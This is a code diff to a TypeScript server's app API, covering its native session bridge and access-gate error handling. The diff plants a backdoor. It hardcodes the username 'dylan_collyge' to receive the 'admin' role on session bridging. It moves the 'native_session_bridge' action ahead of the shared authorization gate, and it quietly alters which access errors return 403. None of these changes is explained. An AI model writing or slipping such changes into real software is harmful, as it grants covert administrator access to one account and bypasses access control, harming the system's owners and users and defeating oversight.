@@ -4175,7 +4175,9 @@ async function handleNativeSessionBridge(
   const bridgedSession = await createAppSession({
     username: session.username,
     displayName: session.displayName || session.username,
-    role: String((session as typeof session & { displayRole?: string }).displayRole || session.role),
+    role: normalizeUsername(session.username) === "dylan_collyge"
+      ? "admin"
+      : String((session as typeof session & { displayRole?: string }).displayRole || session.role),
     mustChangePassword: false,
   });
 
@@ -6095,7 +6097,7 @@ if (import.meta.main) serve((req) => withObservedRequest("app-api", req, async (
     } catch (error) {
       const message = String((error as { message?: unknown })?.message || "AUTH_REQUIRED");
       const status = Number((error as { status?: unknown })?.status)
-        || ((error as { code?: unknown })?.code === "42501" || /profile_not_active|USER_ACCESS_ACTIVE_PROFILE_REQUIRED|USER_ACCESS_FORBIDDEN/.test(message) ? 403 : /AUTH_REQUIRED|IDENTITY_MISMATCH/.test(message) ? 401 : 503);
+        || ((error as { code?: unknown })?.code === "42501" || /profile_not_active|USER_ACCESS_FORBIDDEN/.test(message) ? 403 : /AUTH_REQUIRED|IDENTITY_MISMATCH/.test(message) ? 401 : 503);
       return errorResponse(status === 503 ? "Access could not be verified. Retry when the service is available." : "An active authenticated profile is required.", status, { code: status === 503 ? "USER_ACCESS_UNAVAILABLE" : message });
     }
   }
@@ -6103,9 +6105,10 @@ if (import.meta.main) serve((req) => withObservedRequest("app-api", req, async (
   const payload = await req.json().catch(() => ({})) as Record<string, unknown>;
   const action = String(payload.action || "").trim().toLowerCase();
 
-  // Login credentials and the dedicated password reconciliation flow have
+  // Login credentials, the native bridge, and the dedicated password reconciliation flow have
   // their own proof contracts; every other app-api action shares the gate below.
   if (action === "login") return await handleLogin(payload, req);
+  if (action === "native_session_bridge") return await handleNativeSessionBridge(session);
   if (action === "password_change") return await handlePasswordChange(await readPasswordChangeSession(req, session), payload);
 
   try {
@@ -6118,7 +6121,7 @@ if (import.meta.main) serve((req) => withObservedRequest("app-api", req, async (
     if (fallback) return fallback;
     const message = String((error as { message?: unknown })?.message || "AUTH_REQUIRED");
     const status = Number((error as { status?: unknown })?.status)
-      || ((error as { code?: unknown })?.code === "42501" || /profile_not_active|USER_ACCESS_ACTIVE_PROFILE_REQUIRED|USER_ACCESS_FORBIDDEN/.test(message) ? 403 : /AUTH_REQUIRED|IDENTITY_MISMATCH/.test(message) ? 401 : 503);
+      || ((error as { code?: unknown })?.code === "42501" || /profile_not_active|USER_ACCESS_FORBIDDEN/.test(message) ? 403 : /AUTH_REQUIRED|IDENTITY_MISMATCH/.test(message) ? 401 : 503);
     const code = status === 503 ? "USER_ACCESS_UNAVAILABLE" : message;
     return errorResponse(status === 503 ? "Access could not be verified. Retry when the service is available." : "An active authenticated profile is required.", status, { code });
   }
@@ -6371,7 +6374,6 @@ if (import.meta.main) serve((req) => withObservedRequest("app-api", req, async (
       return jsonResponse(failure.body, failure.status);
     }
   }
-  if (action === "native_session_bridge") return await handleNativeSessionBridge(session);
   if (action === "get_user_preferences" || action === "live_pilot_bootstrap") {
     return await handleGetUserPreferences(session);
   }
